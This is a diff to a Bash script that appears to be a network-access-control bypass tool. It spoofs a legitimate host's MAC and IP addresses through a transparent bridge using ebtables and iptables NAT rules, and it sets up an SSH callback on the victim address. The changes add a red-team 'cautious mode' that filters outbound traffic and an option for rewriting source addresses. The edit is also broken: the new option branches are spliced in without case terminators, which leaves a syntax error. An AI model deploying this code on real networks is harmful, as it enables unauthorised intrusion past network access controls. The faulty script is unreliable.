@@ -10,7 +10,7 @@
 # -----
 
 ## Variables
-VERSION="0.6.5-1715949302"
+VERSION="0.6.5-1768675906"
 
 CMD_ARPTABLES=/usr/sbin/arptables
 CMD_EBTABLES=/usr/sbin/ebtables
@@ -76,7 +76,9 @@ Usage() {
   echo "    -c          start connection setup only"
   echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
   echo "    -t <MAC>    set target (printer or computer) MAC address (COMMAC) manually"
-  echo "    -T <IP>     set target (printer or computer) IP  address (COMIP) manually"
+  echo "    -T <IP>     set target (printer or computer) IP address (COMIP) manually"
+  echo "    -f <RANGE>  filter out all outbound connection except on this range (cautious mode, for Red Team)"
+  echo "    -s <IP>     set source IP address for communication with COMP. WARNING: IP address must exist, for supplicant ARP request to succeed"
   echo "    -h          display this help"
   echo "    -i          start initial setup only"
   echo "    -r          reset all settings"
@@ -93,7 +95,7 @@ Version() {
 
 ## Check if we got all needed parameters
 CheckParams() {
-  while getopts ":1:2:acg:t:T:hirRS" opts
+  while getopts ":1:2:acg:f:s:t:T:hirRS" opts
     do
       case "$opts" in
         "1")
@@ -116,6 +118,10 @@ CheckParams() {
           ;;
         "T")
           COMIP=$OPTARG
+        "f")
+          RESTRICT_TO_DEST_RANGE=$OPTARG
+        "s")
+          TO_COMP_SOURCE_IP=$OPTARG
           ;;
         "h")
           Usage
@@ -301,10 +307,22 @@ ConnectionSetup() {
     fi
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC
+    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $COMPINT -j snat --to-src $GWMAC
+
+    ## Manually set MAC resolution & routing for legitimate supplicant COMP
+    if [ ! -z "$TO_COMP_SOURCE_IP" ]; then ## Only if parameter -s is used
+        arp -s -i $BRINT $COMIP $COMPMAC
+        route add -host $COMIP dev $BRINT
+    fi
 
     ## Create default routes so we can route traffic - all traffic goes to the bridge gateway and this traffic gets Layer 2 sent to GWMAC
     arp -s -i $BRINT $BRGW $GWMAC
-    route add default gw $BRGW dev $BRINT metric 10
+    # In case filter ou mode is spceified, we only route traffic in the defined range
+    if [ -n "$RESTRICT_TO_DEST_RANGE" ]; then
+      ip route add $RESTRICT_TO_DEST_RANGE via $BRGW dev $BRINT metric 10
+    else
+      ip route add default via $BRGW dev $BRINT metric 10
+    fi
 
     ## SSH CALLBACK if we receive inbound on br0 for VICTIMIP:DPORT forward to BRIP on SSH
     if [ "$OPTION_SSH" -eq 1 ]; then
@@ -345,6 +363,13 @@ ConnectionSetup() {
         $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_MULTICAST -j DNAT --to $BRIP:$PORT_UDP_MULTICAST
     fi
 
+    ## Setting up Layer 3 rewrite rules to allow to communicate with COMP (legitimate supplicant)
+    if [ ! -z "$TO_COMP_SOURCE_IP" ]; then ## Only if parameter -s is used
+        $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -d $COMIP -j SNAT -p tcp --to $TO_COMP_SOURCE_IP:$RANGE
+        $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -d $COMIP -j SNAT -p udp --to $TO_COMP_SOURCE_IP:$RANGE
+        $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -d $COMIP -j SNAT -p icmp --to $TO_COMP_SOURCE_IP
+    fi
+
     # Setting up Layer 3 rewrite rules
     # Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMIP and give it a port in the range for NAT
     $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
@@ -361,6 +386,14 @@ ConnectionSetup() {
         echo
         echo -e "$SUCC [ + ] All setup steps complete; check ports are still lit and operational $TXTRST"
         echo
+    fi
+
+    ## Cautious-mode filtering rules
+    if [ -n "$RESTRICT_TO_DEST_RANGE" ]; then
+      # Allow only selected outbound traffic from your machine
+      $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -d $RESTRICT_TO_DEST_RANGE -j ACCEPT
+      # Drop all the rest
+      $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -j DROP
     fi
 
     ## Re-enabling traffic flow; monitor ports for lockout
